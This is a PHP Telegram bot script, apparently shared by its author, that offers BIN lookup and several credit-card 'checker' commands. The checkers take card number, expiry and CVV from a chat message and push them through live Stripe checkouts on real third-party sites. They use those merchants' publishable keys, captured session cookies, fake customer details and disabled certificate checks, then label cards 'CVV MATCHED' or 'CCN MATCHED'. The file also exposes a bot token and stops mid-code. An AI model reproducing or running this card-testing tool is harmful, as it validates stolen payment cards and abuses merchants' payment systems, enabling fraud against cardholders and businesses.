<?php

////////////////=============[Zeltrax Bot Raw]=============////////////////
////////==========[Join @TechSoham and @ZeltraxChat for more]==========////////

$botToken = "1648835916:AAFLReqauS7M_9urC5Q-VfH12IUsiaXRFxo"; // Enter ur bot token
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];

//////////=========[Start Command]=========//////////

if (strpos($message, "/start") === 0){
sendMessage($chatId, "<b>Hello there!!%0AType /cmds to know all my commands!!%0A%0ABot Made by:  @TechSoham</b>", $message_id);
}

//////////=========[Cmds Command]=========//////////

elseif (strpos($message, "/cmds") === 0){
sendMessage($chatId, "<b>╭──────────────────────────────────╮</b>%0A<b>├ Bin lookup:</b> <code>/bin</code> %0A<b>├ Stripe CC Checker [Closed]:</b> <code>/chk</code> %0A<b>├ Private Gateway CC Checker :</b> <code>/schk</code> %0A<b>├ Private Gateway CC Checker [Closed]:</b> <code>/pri</code> %0A<b>├ Info:</b> <code>/info</code> To know ur info%0A<b>├ Bot Made by:  @TechSoham</b>%0A<b>╰──────────────────────────────────╯</b>", $message_id);
}

//////////=========[Info Command]=========//////////

elseif (strpos($message, "/info") === 0){
sendMessage($chatId, "<b>╭───────────────────────────────╮%0A</b><b> ├ ID:</b> <code>$userId</code>%0A<b> ├ First Name:</b> $firstname%0A<b> ├ Username:</b> @$username%0A<b> ├ Bot Made by:  @TechSoham</b>%0A<b>╰───────────────────────────────╯</b>", $message_id);
}

//////////=========[Bin Command]=========//////////

elseif (strpos($message, "/bin") === 0){
$bin = substr($message, 5);
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
};
sendMessage($chatId, '<b>✅ Valid Bin</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot Made by:  @TechSoham</b>', $message_id);
}

//////////=========[Chk Command]=========//////////
elseif (strpos($message, "/chk") === 0){
$lista = substr($message, 5);
$i = explode("|", $lista);
$cc = $i[0];
$mes = $i[1];
$ano = $i[2];
$cvv = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
};

///////////////////////////////////////////////////////////////////////////////////////////////////////////////


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-ch-ua-mobile: ?0',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site'));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,  'type=card&billing_details[address][postal_code]=10010&billing_details[name]=Markie+Alisona&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=c683262a-ede4-4242-97bd-c31031f76a2378b2ea&muid=ef32d2fe-0794-41d4-b03a-94d6bf5b2cab153f36&sid=c41e072a-c900-40b4-bc27-3397cd84cd94029dd1&pasted_fields=number&payment_user_agent=stripe.js%2F9b0220b09%3B+stripe-js-v3%2F9b0220b09&time_on_page=103043&referrer=https%3A%2F%2Fassociationofmedicalintuitives.com%2F&key=pk_live_d9OqXMvZiULu3i6lFvu4qzEf00nzTDepvE');

$result = curl_exec($ch);
$token = trim(strip_tags(getStr($result,'"id": "','"')));

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://associationofmedicalintuitives.com/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: associationofmedicalintuitives.com',
'accept: application/json, text/javascript, */*; q=0.01',
'accept-language: en-US,en;q=0.9',
'content-type: multipart/form-data; boundary=----WebKitFormBoundaryTLtCgYaCm2UbkAIt',
'cookie: wordpress_sec_e9267165d273f8c65c26de7dbbbcc5f6=danniesoham78434%7C1613716647%7C2jBhRGIRIqX5O8ke6YRUWO8OQXdsg108LRhWReMMP0p%7C54763995a965f214f5012527ad70ac0585d456acb83d35c4f53c35247b6b6e8d; _ga=GA1.2.1648896737.1613543611; _gid=GA1.2.1594961481.1613543611; slimstat_tracking_code=1010.390bb10f5e023285e9337b48e9ab5cc4; wordpress_logged_in_e9267165d273f8c65c26de7dbbbcc5f6=danniesoham78434%7C1613716647%7C2jBhRGIRIqX5O8ke6YRUWO8OQXdsg108LRhWReMMP0p%7Cde165f49d5b4916cc022dd204ac2a60e40799d03f90fa3036aab19036d977cfa; wpSGCacheBypass=1; __stripe_mid=ef32d2fe-0794-41d4-b03a-94d6bf5b2cab153f36; __stripe_sid=c41e072a-c900-40b4-bc27-3397cd84cd94029dd1',
'origin: https://associationofmedicalintuitives.com',
'referer: https://associationofmedicalintuitives.com/register/student/?action=checkout&txn=1c',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin'));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,  '------WebKitFormBoundaryTLtCgYaCm2UbkAIt
Content-Disposition: form-data; name="mepr_transaction_id"

359
------WebKitFormBoundaryTLtCgYaCm2UbkAIt
Content-Disposition: form-data; name="address_required"

0
------WebKitFormBoundaryTLtCgYaCm2UbkAIt
Content-Disposition: form-data; name="card-name"

Markie Alisona
------WebKitFormBoundaryTLtCgYaCm2UbkAIt
Content-Disposition: form-data; name="payment_method_id"

'.$token.'
------WebKitFormBoundaryTLtCgYaCm2UbkAIt
Content-Disposition: form-data; name="action"

mepr_stripe_confirm_payment
------WebKitFormBoundaryTLtCgYaCm2UbkAIt
Content-Disposition: form-data; name="mepr_current_url"

https://associationofmedicalintuitives.com/register/student/?action=checkout&txn=1c#mepr_jump
------WebKitFormBoundaryTLtCgYaCm2UbkAIt
Content-Disposition: form-data; name="subscription_id"

sub_IzeLIDJEOUaSTc
------WebKitFormBoundaryTLtCgYaCm2UbkAIt--');

$result1 = curl_exec($ch);



//////////////////////////////////////////////////////////////////////////////////////////////////////////////

if(strpos($result1, '"cvc_check": "pass"')){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<b>Response:</b> <b>CVV MATCHED 🟢🟢</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Stripe Auth (Req 4)%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif(strpos($result1, "Your card's security code is incorrect. (card_error)")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<b>Response:</b> <b>CCN MATCHED 🟠🟠</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Stripe Auth (Req 4)%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif(strpos($result1, "Stripe API error occurred: Your card has insufficient funds.")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<b>Response:</b> <b>CVV MATCHED 🟢🟢 [Insuff. Funds]</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Auth:</b> Stripe Auth (Req 4)%0A<b>Type:</b> $type%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif(strpos($result1, "Your card number is incorrect. (card_error)")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<b>Response:</b> <b>INCORRECT CARD NUMBER 🟢🟢 </b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Auth:</b> Stripe Auth (Req 4)%0A<b>Type:</b> $type%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif(strpos($result1, "Your card was declined. (card_error)")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<b>Response:</b> <b>CARD DECLINED 🔴🔴</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Stripe Auth (Req 4)%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif(strpos($result1, "Card payment failed, please try another payment method")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<b>Response:</b> <b>GENERIC DECLINE 🔴🔴</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Stripe Auth (Req 4)%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
else{
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<b>Response:</b><b>Proxy Error Try Again</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Stripe Auth (Req 4)%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
};
// Add more responses if you want
curl_close($ch);
}

//////////=========[Conpay Command]=========//////////


//////////=========[Schk (1req) Command]=========//////////

elseif (strpos($message, "/schk") === 0){
$lista = substr($message, 6);
$i     = explode("|", $lista);
$cc    = $i[0];
$mon    = $i[1];
$year  = $i[2];
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
};

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://canadianteachermagazine.com/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: canadianteachermagazine.com',
'accept: application/json, text/javascript, */*; q=0.01',
'accept-language: en-US,en;q=0.9',
'content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://canadianteachermagazine.com',
'referer: https://canadianteachermagazine.com/register/',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin'));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,  'action=arm_membership_setup_form_ajax_action&form_random_key=1_x8YM5HVtHA&setup_id=1&setup_action=membership_setup&arm_user_old_plan=0&arm_is_user_logged_in_flag=0&arm_front_plan_skin_type=&subscription_plan=3&arm_plan_type=recurring&arm_payment_cycle_plan_3=0&payment_cycle_3=0&user_login=Markcufhba&first_name=Markjuiowd+&last_name=Alisonsbcub&user_email=Markbubub@gmail.com&user_pass=soham%409205&arm_action=please-signup&redirect_to=https%3A%2F%2Fcanadianteachermagazine.com&isAdmin=0&referral_url=https%3A%2F%2Fcanadianteachermagazine.com&arm_form_id=101&form_filter_kp=211&form_filter_st=1610618889&arm_nonce_check='.$nonce122.'&arm_front_gateway_skin_type=radio&payment_gateway=stripe&arm_payment_mode%5Bstripe%5D=both&stripe%5Bcard_holder_name%5D=Markbaxiu+Alisonbwsciu&stripe%5Bcard_number%5D='.$cc.'&stripe%5Bexp_month%5D='.$mon.'&stripe%5Bexp_year%5D='.$year.'&stripe%5Bcvc%5D='.$cvv.'&arm_selected_payment_mode=auto_debit_subscription&arm_total_payable_amount=2.00&arm_zero_amount_discount=0.00&gqptwq87=');
$result = curl_exec($ch);
$nonce122 = trim(strip_tags(getstr($result,'"arm_nonce_check":"','"')));
//////////////////////////////////////////////////////////////////////////////////////////////////////////////

if(strpos($result, 'Your card required Stripe 3D authentication. Recommend to use Stripe SCA Method')){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>CVV MATCHED 🟢🟢</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Scheme:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Stripe (Req 2)%0A<u>Checked By:</u> @$username%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif (strpos($result, 'security code is incorrect.')){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>CCN MATCHED 🟠🟠</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Scheme:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Stripe (Req 2)%0A<u>Checked By:</u> @$username%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif (strpos($result, 'Your card has insufficient funds.')){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>CVV MATCHED 🟢🟢 [Insuff. Funds]</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Scheme:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Stripe (Req 2)%0A<u>Checked By:</u> @$username%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif (strpos($result, 'Your card has expired.')){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>Expired Card 🔴🔴</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Scheme:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Stripe (Req 2)%0A<u>Checked By:</u> @$username%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif (strpos($result, 'Your card was declined.')){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>Card Declined 🔴🔴</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Scheme:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Stripe (Req 2)%0A<u>Checked By:</u> @$username%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif (strpos($result, 'Your card number is incorrect.')){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>Incorrect Card Number 🔴🔴</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Scheme:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Stripe (Req 2)%0A<u>Checked By:</u> @$username%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif (strpos($result, 'Your card does not support this type of purchase.')){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>Your Card Not Support This Purchase 🔴🔴</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Scheme:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Stripe (Req 2)%0A<u>Checked By:</u> @$username%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
else{
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u><b>Error Not listed</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Scheme:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Stripe (Req 2)%0A<u>Checked By:</u> @$username%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
};
// Add more responses if you want
curl_close($ch);
}

elseif (strpos($message, "/pri") === 0){
$lista = substr($message, 5);
$i = explode("|", $lista);
$cc = $i[0];
$mes = $i[1];
$ano = $i[2];
$cvv = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
};

///////////////////////////////////////////////////////////////////////////////////////////////////////////////


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-ch-ua-mobile: ?0',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site'));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,  'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=c683262a-ede4-4242-97bd-c31031f76a2378b2ea&muid=95e9e1da-c2c1-4a40-ab9a-7f9b14526b9b2f46bd&sid=0a5fc9ac-f869-4452-a4ad-b2f737f688b11a8fb9&pasted_fields=number&payment_user_agent=stripe.js%2Fc7a0b9a66%3B+stripe-js-v3%2Fc7a0b9a66&time_on_page=75184&referrer=https%3A%2F%2Fmy.a2hosting.com%2F&key=pk_live_6x9vw8q3QDsRmGyTHTzR3Vza00oSrEQzS2');

$result = curl_exec($ch);
$token1239 = trim(strip_tags(getStr($result,'"id": "','"')));

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://my.a2hosting.com/index.php?rp=/stripe/payment/intent');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: my.a2hosting.com',
'accept: application/json, text/javascript, */*; q=0.01',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://my.a2hosting.com',
'referer: https://my.a2hosting.com/cart.php?a=checkout&e=false',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin'));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,  'token=88a1df818b768789da7d9f06810eca36f4897bc5&submit=true&custtype=new&loginemail=&loginpassword=&firstname=Markie&lastname=Alisona&email=markie21sedh%40openitbox.com&phonenumber=4583294237&companyname=vuyegtrw&address1=Street+104%2C+Street+104&address2=Street+154&city=Kalamazoo&state=MI&postcode=49006&country=US&tax_id=&customfield%5B769%5D=&password=soham%409205&password2=soham%409205&securityqid=1&securityqans=dog&paymentmethod=stripe&ccinfo=new&ccdescription=&marketingoptin=1&accepttos=on&payment_method_id='.$token1239.'');

$result126 = curl_exec($ch);



//////////////////////////////////////////////////////////////////////////////////////////////////////////////

if(strpos($result126, "Thank You.")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>CVV MATCHED 🟢🟢</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Scheme:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Private Gateway %0A<u>Checked By:</u> @$username%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif(strpos($result126, 'security code is incorrect')){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>CCN MATCHED 🟠🟠</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Scheme:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Private Gateway %0A<u>Checked By:</u> @$username%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif(strpos($result126, "Your card has insufficient funds")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>CVV MATCHED 🟢🟢 [Insuff. Funds]</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Scheme:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Private Gateway %0A<u>Checked By:</u> @$username%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif(strpos($result126, 'Your card has expired')){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>Expired Card 🔴🔴</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Scheme:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Private Gateway %0A<u>Checked By:</u> @$username%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif(strpos($result126, "Your card was declined")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>DO NOT HONOR 🔴🔴</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Scheme:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Private Gateway %0A<u>Checked By:</u> @$username%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif(strpos($result126, "Your card number is incorrect")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>Incorrect Card Number 🔴🔴</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Scheme:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Private Gateway %0A<u>Checked By:</u> @$username%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
elseif(strpos($result126, 'Your card does not support this type of purchase')){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>Your Card Not Support This Purchase 🔴🔴</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Scheme:</b> $scheme%0A<b>Type:</b> $type%0A<b>Auth:</b> Private Gateway %0A<u>Checked By:</u> @$username%0A<b>Bot Made by:  @TechSoham</b>", $message_id);
}
else{
